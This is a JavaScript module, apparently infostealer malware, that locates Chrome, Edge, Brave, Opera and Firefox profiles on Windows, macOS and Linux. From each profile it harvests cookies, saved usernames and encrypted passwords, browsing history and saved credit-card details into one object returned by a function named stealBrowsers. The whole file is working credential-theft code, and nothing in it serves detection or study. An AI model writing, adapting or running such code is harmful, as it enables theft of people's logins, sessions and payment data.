import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import Database from "better-sqlite3";

function browserPaths() {
  const home = os.homedir();
  const p = os.platform();

  if (p === "win32") {
    const local = process.env.LOCALAPPDATA;
    const roaming = process.env.APPDATA;
    return [
      { name: "Chrome",  base: path.join(local, "Google", "Chrome", "User Data"), chromium: true },
      { name: "Edge",    base: path.join(local, "Microsoft", "Edge", "User Data"), chromium: true },
      { name: "Brave",   base: path.join(local, "BraveSoftware", "Brave-Browser", "User Data"), chromium: true },
      { name: "Opera",   base: path.join(roaming, "Opera Software", "Opera Stable"), chromium: true },
      { name: "Firefox", base: path.join(roaming, "Mozilla", "Firefox", "Profiles"), firefox: true },
    ];
  }
  if (p === "darwin") {
    const app = path.join(home, "Library", "Application Support");
    return [
      { name: "Chrome",  base: path.join(app, "Google", "Chrome"), chromium: true },
      { name: "Edge",    base: path.join(app, "Microsoft Edge"), chromium: true },
      { name: "Brave",   base: path.join(app, "BraveSoftware", "Brave-Browser"), chromium: true },
      { name: "Firefox", base: path.join(app, "Firefox", "Profiles"), firefox: true },
    ];
  }
  return [
    { name: "Chrome",   base: path.join(home, ".config", "google-chrome"), chromium: true },
    { name: "Chromium", base: path.join(home, ".config", "chromium"), chromium: true },
    { name: "Brave",    base: path.join(home, ".config", "BraveSoftware", "Brave-Browser"), chromium: true },
    { name: "Firefox",  base: path.join(home, ".mozilla", "firefox"), firefox: true },
  ];
}

function extractChromium(base) {
  const out = { cookies: [], passwords: [], history: [], cards: [] };
  if (!fs.existsSync(base)) return out;

  const profiles = fs.readdirSync(base, { withFileTypes: true })
    .filter(d => d.isDirectory() && (d.name === "Default" || d.name.startsWith("Profile")))
    .map(d => path.join(base, d.name));

  for (const profile of profiles) {
    const name = path.basename(profile);

    const cookiesPath = path.join(profile, "Network", "Cookies");
    if (fs.existsSync(cookiesPath)) {
      try {
        const db = new Database(cookiesPath, { readonly: true, fileMustExist: true });
        const rows = db.prepare("SELECT host_key, name, encrypted_value FROM cookies").all();
        out.cookies.push(...rows.map(r => ({
          browser: name, host: r.host_key, cookie: r.name,
          enc: Buffer.from(r.encrypted_value).toString("base64"),
        })));
        db.close();
      } catch {}
    }

    const loginPath = path.join(profile, "Login Data");
    if (fs.existsSync(loginPath)) {
      try {
        const db = new Database(loginPath, { readonly: true, fileMustExist: true });
        const rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
        out.passwords.push(...rows.map(r => ({
          browser: name, url: r.origin_url, user: r.username_value,
          enc: Buffer.from(r.password_value).toString("base64"),
        })));
        db.close();
      } catch {}
    }

    const histPath = path.join(profile, "History");
    if (fs.existsSync(histPath)) {
      try {
        const db = new Database(histPath, { readonly: true, fileMustExist: true });
        const rows = db.prepare("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 100").all();
        out.history.push(...rows.map(r => ({
          browser: name, url: r.url, title: r.title, visits: r.visit_count,
        })));
        db.close();
      } catch {}
    }

    const cardPath = path.join(profile, "Web Data");
    if (fs.existsSync(cardPath)) {
      try {
        const db = new Database(cardPath, { readonly: true, fileMustExist: true });
        const rows = db.prepare("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").all();
        out.cards.push(...rows.map(r => ({
          browser: name, name: r.name_on_card,
          exp: `${r.expiration_month}/${r.expiration_year}`,
          enc: Buffer.from(r.card_number_encrypted).toString("base64"),
        })));
        db.close();
      } catch {}
    }
  }
  return out;
}

function extractFirefox(base) {
  const out = { cookies: [], passwords: [], history: [], cards: [] };
  if (!fs.existsSync(base)) return out;

  const profiles = fs.readdirSync(base, { withFileTypes: true })
    .filter(d => d.isDirectory() && d.name.includes("."))
    .map(d => path.join(base, d.name));

  for (const profile of profiles) {
    const name = path.basename(profile);

    const logins = path.join(profile, "logins.json");
    if (fs.existsSync(logins)) {
      try {
        const data = JSON.parse(fs.readFileSync(logins, "utf-8"));
        for (const l of data.logins || []) {
          out.passwords.push({
            browser: name, url: l.hostname, user: l.usernameField,
            enc: (l.passwordField || "").slice(0, 200),
          });
        }
      } catch {}
    }

    const places = path.join(profile, "places.sqlite");
    if (fs.existsSync(places)) {
      try {
        const db = new Database(places, { readonly: true, fileMustExist: true });
        const rows = db.prepare("SELECT url, title, visit_count FROM moz_places ORDER BY visit_count DESC LIMIT 100").all();
        out.history.push(...rows.map(r => ({
          browser: name, url: r.url, title: r.title, visits: r.visit_count,
        })));
        db.close();
      } catch {}
    }

    const cookies = path.join(profile, "cookies.sqlite");
    if (fs.existsSync(cookies)) {
      try {
        const db = new Database(cookies, { readonly: true, fileMustExist: true });
        const rows = db.prepare("SELECT host, name, value FROM moz_cookies").all();
        out.cookies.push(...rows.map(r => ({
          browser: name, host: r.host, cookie: r.name, enc: r.value,
        })));
        db.close();
      } catch {}
    }
  }
  return out;
}

export function stealBrowsers() {
  const result = { cookies: [], passwords: [], history: [], cards: [] };
  for (const p of browserPaths()) {
    const data = p.firefox ? extractFirefox(p.base) : extractChromium(p.base);
    result.cookies.push(...data.cookies);
    result.passwords.push(...data.passwords);
    result.history.push(...data.history);
    result.cards.push(...data.cards);
  }
  return result;
}
